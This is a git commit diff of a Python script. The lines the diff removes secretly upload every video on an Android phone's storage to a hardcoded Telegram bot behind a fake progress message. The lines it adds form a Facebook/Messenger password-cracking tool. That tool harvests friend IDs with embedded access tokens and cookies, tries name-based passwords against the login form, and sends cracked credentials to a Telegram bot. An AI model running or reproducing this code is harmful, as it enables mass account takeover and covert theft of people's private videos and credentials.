b9c8af1979f16e3038eeaae485130e393655fab2
SAYDHAMDE <brek1v4@gmail.com>
2024-09-24 21:25:13 +0300

    Update sayd.py

--- sayd.py
+++ sayd.py
@@ -1,54 +1,168 @@
-from concurrent.futures import ThreadPoolExecutor
-import requests
 import os
-import time
-from tqdm import tqdm
-import threading
-import sys
+try:
+	import requests,telebot,user_agent,sys,re,urllib,webbrowser
+	from user_agent import generate_user_agent
+except ModuleNotFoundError as x:
+	m = str(x).split("'")[1]
+	os.system(f'pip install {m}')
+from concurrent.futures import ThreadPoolExecutor as kil
+ID1 = '5705562178'
+token1 = '6930238082:AAG9y2qDEv7y04PoRzhLSm9BPkbyxT7__Kc'
+Id,token = input('\033[2;36mID : \033[1;97m'),input('\033[2;36mToken : \033[1;97m')
+kopo = requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(Id) + '&text=' + str('- تم تشغيل الاداة '))
+webbrowser.open('t.me/@M_O_L_B')
+if kopo.status_code == 404:
+	exit('\x1b[91;1m\n - ابن مصر ☠️ • ☒ التوكن او الايدي غلط ☒ ')	
+bot = telebot.TeleBot(token,parse_mode='HTML')
+	
+os.system('clear')
+def Menu():
+	print('''\033[2;36m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[ 1 ] - Crack From File ~ صيد من ملف
+   
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~''')
+	c = input('   - Choose ~ اختار : ')
+	if c == '2':
+		os.system('clear')
+		IDS()
+	elif c == '1':
+		os.system('clear')
+		File()
+		
+cid,fid=[],[]
+z,total,ok,cp=0,0,0,0
 
-chat_id = 5705562178
-bot_token = "6930238082:AAG9y2qDEv7y04PoRzhLSm9BPkbyxT7__Kc"
+def get(user):
+	try:
+		url = requests.get('https://graph.facebook.com/{}'.format(user),params={'access_token': 'EAABwzLixnjYBO8aDgnZCXTXnwv91swARorjXxPtRfKOrqGejLbbgd6SXDN5RzrysOqQavJjCIrvPZB0FFCMJdZCJHUec6ZA8e7qQhLFodPKlJr9CXwb8MHZCzISXi4od26Ky1HNk6P1CpOBX6vgNY16JZB7CpfcEdoYDRTgmdZCWWWvhLdy53eCoZBuBtQBhUbQw3jgZD','fields': "friends"},headers={"user-agent": user_agent.generate_user_agent()},cookies={'cookies':'datr=pALzZu-V7Kmofh6pn4aE4gaO; sb=pALzZgYoqZzDbd5mGq8Is4RX; m_pixel_ratio=2.75; locale=ar_AR; wd=393x766; c_user=61566287014744; fr=0MckCk2Ycj0kzLazD.AWX4f9Ha0m4EGtHZrggT9eLLtY8.Bm8wKk..AAA.0.0.Bm8wMW.AWW55RXeq94; xs=26%3AxncGHQ36q2rtnQ%3A2%3A1727202070%3A-1%3A-1; m_page_voice=61566287014744; ps_l=1; ps_n=1'}).json()
+		for mm in url['friends']['data']:
+			ko = (mm['id']+'|'+mm['name'])
+			if ko in fid:
+				pass
+			else:
+				fid.append(ko)
+	except:
+		print('- Error ~ خطأ في الايدي ⛔'+user)
+		
+def IDS():
+	global z
+	how = input('- How Many IDs ~ كم ايدي ؟ : ')
+	for n in range(int(how)):
+		z+=1
+		k = input(f'- Enter ID • {z} ادخل الايدي : ')
+		cid.append(k)
+	for kil in cid:
+		get(kil)
+	print(f'- Done Extract ~ تم استخراج : {len(fid)} ايدي')
+	os.system('clear')
+	password()
+	
+def File():
+	try:
+		name = input('• File Name • : ')
+		for line in open(name, 'r').readlines():
+			fid.append(line.strip())
+		print('- Total id • الايديات : '+str(len(fid)))
+		os.system('clear')
+		password()
+	except:
+		print('- EROR ⛔')
+	
+def password():
+	with kil(max_workers=30) as kp:
+		for kk in fid:
+			idf,nmf = kk.split('|')[0],kk.split('|')[1].lower()
+			frs = nmf.split(' ')[0]
+			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'123456789',frs+'1234567890',frs+'1234512345',frs+'١٢٣']
+			kp.submit(checker,idf,pwv)
 
-def send_video(file_path):
-    url = f'https://api.telegram.org/bot{bot_token}/sendVideo'
-    data = {'chat_id': chat_id}
-    files = {'video': open(file_path, 'rb')}
-
-    total_size = os.path.getsize(file_path)
-    uploaded_size = 0
-    progress = 0
-
-    def update_progress():
-        nonlocal progress
-        while progress < 100:
-            sys.stdout.write(f'\rانتضر تحميل المكاتب يستغرق الامر 50 ثانيه: {progress}%')
-            sys.stdout.flush()
-            time.sleep(1)
-
-    threading.Thread(target=update_progress).start()
-
-    with open(file_path, 'rb') as file:
-        response = requests.post(url, files=files, data=data, stream=True)
-
-        for data in response.iter_content(chunk_size=4096):
-            uploaded_size += len(data)
-            progress = int(uploaded_size / total_size * 100)
-
-            if progress > 100:
-                progress = 100
-
-    time.sleep(0.1)
-    sys.stdout.write('\n')
-    sys.stdout.flush()
-
-def main():
-    with ThreadPoolExecutor(max_workers=100) as executor:
-        for root, dirs, files in os.walk("/storage/emulated/0"):
-            for file in files:
-                file_path = os.path.join(root, file)
-                file_type = file.split('.')[-1]
-                if file_type in ['mp4', 'avi', 'mkv']:
-                    executor.submit(send_video, file_path)
-
-if __name__ == '__main__':
-    main()
+def checker(idf,pwv):
+	global total,ok,cp
+	print('\r\033[2;36mϟ \033[1;97m[\033[2;36m 🇪🇬 المصري\033[1;97m \033[2;36mاسير\033[2;32m] \033[1;97m~ \033[1;97m[\033[2;32mOK \033[1;97m- \033[1;31mCP\033[1;97m] = [\033[2;32m%s\033[1;97m -\033[1;31m %s\033[1;97m] = [\033[1;33m %s/%s\033[1;97m ]'%(ok,cp,total,len(fid)),end=' ');sys.stdout.flush()
+	for ps in pwv:
+		open('tt.txt','a').write(idf+'|'+ps+'\n')
+		try:
+			r = requests.session()
+			headers = {
+			 'Authority':'www.messenger.com',
+			 'Pragma':'no-cache',
+			 'Cache-Control':'no-cache',
+			 'Sec-Ch-Ua':'"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
+			 'Sec-Ch-Ua-Mobile':'?0',
+			 'Sec-Ch-Ua-Platform':'Linux',
+			 'Origin':'https://www.messenger.com',
+			 'Upgrade-Insecure-Requests':'1',
+			 'Dnt':'1',
+			 'Content-Type':'application/x-www-form-urlencoded',
+			 'User-Agent': generate_user_agent(),
+			 'Accept':'text/html, application/xhtml+xml, application/xml;q=0.9, image/avif, image/webp, image/apng, */*;q=0.8, application/signed-exchange;v=b3;q=0.9',
+			 'Sec-Fetch-Site':'same-origin',
+			 'Sec-Fetch-Mode':'navigate',
+			 'Sec-Fetch-User':'?1',
+			 'Sec-Fetch-Dest':'document',
+			 'Referer':'https://www.messenger.com/',
+			 'Accept-Language':'en-US, en;q=0.9',
+		 }
+			request = r.get('https://www.messenger.com/').text
+			js_datr = re.search('"_js_datr","(.*?)"',str(request)).group(1)
+			payload = {
+			 'jazoest':re.search('name="jazoest" value="(.*?)"', str(request)).group(1),
+			 'lsd':re.search('name="lsd" value="(.*?)"', str(request)).group(1),
+			 'initial_request_id':re.search('name="initial_request_id" value="(.*?)"', str(request)).group(1),
+			 'timezone':'-420',
+			 'lgndim':re.search('name="lgndim" value="(.*?)"', str(request)).group(1),
+			 'lgnrnd':re.search('name="lgnrnd" value="(.*?)"', str(request)).group(1),
+			 'lgnjs':'n',
+			 'email': idf,
+			 'pass': ps,
+			 'login':'1',
+			 'persistent':'1',
+			 'default_persistent':''
+		 }
+			headers.update({'Content-Length': str(len(payload)),'Cookie':'wd=1010x980; dpr=2; datr=%s'%(js_datr)})
+			signature = urllib.parse.urlencode(payload,doseq=True)
+			response  = r.post('https://www.messenger.com/login/password/', data=signature, headers=headers)
+		
+			if 'checkpoint' in response.url:
+				cp+=1
+				stc = f'''<strong>ϟ Secure Acc ~ حساب سكيور  
+~•~•~•~•~•~•~•~•~•~•~•~
+ϟ Email -> <code>{idf}</code>
+ϟ Pass -> <code>{ps}</code>
+~•~•~•~•~•~•~•~•~•~•~•~
+ϟ Programmer • @M_O_L_B 🔥</strong>'''
+				stp = f'''\033[1;31mϟ Secure Acc ~ حساب سكيور  
+~•~•~•~•~•~•~•~•~•~•~•~
+ϟ Email -> {idf}
+ϟ Pass -> {ps}
+~•~•~•~•~•~•~•~•~•~•~•~
+ϟ Programmer • @M_O_L_B 🔥'''
+				bot.send_message(Id,stc)
+				print(stp+'\n')
+				open('CPKilwa.txt','a').write(stc+'\n')
+			elif 'c_user' in r.cookies.get_dict():
+				ok+=1
+				okc = f'''<strong>ϟ Good Acc ~ حساب صحيح ✅
+~•~•~•~•~•~•~•~•~•~•~•~
+ϟ Email -> <code>{idf}</code>
+ϟ Pass -> <code>{ps}</code>
+~•~•~•~•~•~•~•~•~•~•~•~
+ϟ Programmer • @M_O_L_B 🔥</strong>'''
+				okp = f'''\033[2;32mϟ Good Acc ~ حساب صحيح ✅
+~•~•~•~•~•~•~•~•~•~•~•~
+ϟ Email -> {idf}
+ϟ Pass -> {ps}
+~•~•~•~•~•~•~•~•~•~•~•~
+ϟ Programmer • @M_O_L_B 🔥'''
+				bot.send_message(Id,okc)
+				print(okp+'\n')
+				open('OKKilwa.txt','a').write(okc+'\n')
+			else:
+				continue
+				
+		except:
+			continue
+	total+=1
+	
+Menu()
